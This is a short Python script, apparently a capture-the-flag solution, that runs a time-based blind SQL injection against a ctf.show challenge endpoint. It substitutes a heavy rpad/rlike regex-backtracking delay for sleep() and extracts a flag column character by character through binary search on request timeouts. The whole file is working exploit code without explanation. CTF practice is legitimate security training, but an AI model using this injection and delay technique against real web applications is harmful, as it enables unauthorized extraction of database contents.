import time
import requests
url = 'http://3471a536-3547-4d4b-93c6-06020fab5ffe.challenge.ctf.show/api/index.php'
flag = ''
sleep_rep = "concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) rlike '(a.*)+(a.*)+b'"

for i in range(60):
    lenth = len(flag)
    min,max = 32,128
    while True:
        j = min + (max-min)//2
        if(min == j):
            flag += chr(j)
            print(flag)
            break

        payload = {"ip":f"'') or if(ascii(substr((select group_concat(flagaac) from ctfshow_flagxc),{i},1))<{j},{sleep_rep},'False')#"
                   ,'debug':0}

        try:
            r = requests.post(url=url,data=payload,timeout=0.5)
            min = j
        except:
            max = j
        time.sleep(0.2)